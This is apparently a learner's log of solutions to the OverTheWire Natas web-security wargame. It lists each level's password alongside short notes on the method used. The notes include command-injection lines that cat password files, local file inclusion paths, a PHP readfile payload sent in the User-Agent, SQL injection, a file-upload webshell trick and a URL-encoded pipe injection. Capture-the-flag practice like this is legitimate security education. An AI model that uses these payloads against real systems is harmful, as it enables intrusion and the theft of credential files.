#natas
0 - 1: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq // inspect web page
1 - 2: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI // F12 instead of right click
2 - 3: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH // I had to isntall wsl and linux for that... update: was actually just exposed directory in the /files/ path.
3 - 4: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ // robots.txt
4 - 5: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK // curl.exe --user "natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" --referer "http://natas5.natas.labs.overthewire.org/" "http://natas4.natas.labs.overthewire.org/index.php"
5 - 6: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned // Dev Tools, Application, Cookies and edit...
6 - 7: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS // Open the "secret.inc" lol
7 - 8: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q // Edit the ="about" with /etc/natas_webpass/natas8 OR http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
8 - 9: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t // reverse the encoding. btw, hex2bin is NOT hex to binary. search up as PHP function next time.
9 - 10: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu // ; cat /etc/natas_webpass/natas10 Chat wont help me with that for some reason fuck him.
10 - 11: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk // grep. i didnt do it by myself  x
11 - 12: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB // no idea how to solve it. i couldnt even do it with a walkthrough.
12 - 13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC // BURPSUITE FTW!!! create a php file to cat the natas pass and intercept the data before its sent to change from jpg to php!
13 - 14: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ // same trick as last time, but add a gif header (magic bytes) to pass exif_imagetype() ! very exciting!
14 - 15: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx // " or ""=" sql injection. it makes the sql condition become true and then just logs me in i guess
15 - 16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo // chat made a binary search python file...
16 - 17: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC // didnt built this by myself. i didnt find the exploit by myself. chat helped a lot. too much for learning.
17 - 18: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ // almost everything by myself
18 - 19: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr // EVERYTHING BY MYSELF!!!!! i sent the request to burpsuite and used the repeater on the cookie from 0 - 640. 119 gave me a bigger length so i checked it and it worked!
19 - 20: p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw // Almost the same thing, but it was hex encoded and i solved with python and multithreaded with chatGPT.
20 - 21: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH // I was impatient and chat solved it. it revolved around injecting a new line to the session as admin 1 and giving myself admin permissions.
21 - 22: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz // the only clue i needed was to use burpsuite. i intercepted the request and replaced the align with admin 1 and copied the cookie to the other website too and it worked! so happy.
22 - 23: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs // adding /?revelio=1 and monitoring via burpsuite and intercepting every redirect actually shows the password before the redirect.
23 - 24: MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd // because it was comparing it to 10 and comparing numbers to strings is not a good idea, i inputted 11iloveyou.
24 - 25: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws // http://natas24.natas.labs.overthewire.org/?passwd[]=1
25 - 26: cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE // <?php readfile("/etc/natas_webpass/natas26"); ?> as the user agent, access the logs via http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_"cookie".log chat helped to understand.
26 - 27: u3RRffXjysjgwFU6b9xa23i6prmUsYne // i dont know!!!!!!!!!
27 - 28: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj // you need to create a user longer than 64 bytes and then log into it without the char at the end (null bytes and a normal char at the end). i did not find it by myself. i watched a walkthrough. i feel like iam stupid.
28 - 29: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns // Walkthrough. its very interesting though.
29 - 30: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH // i used a walkthough and learned a lot. i should have fuzzed and find out that | does stuff. i should have used url encoding because i am dealing with a url. then i should have just understand my pwd and ls -la and understand the filtering. the payload is that http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20%2Fetc%2F%2A_webpass%2F%2A30%3B which is also |cat /etc/*_webpass/*30;
pretty simple once finding out with burpsuite.
30 - 31: 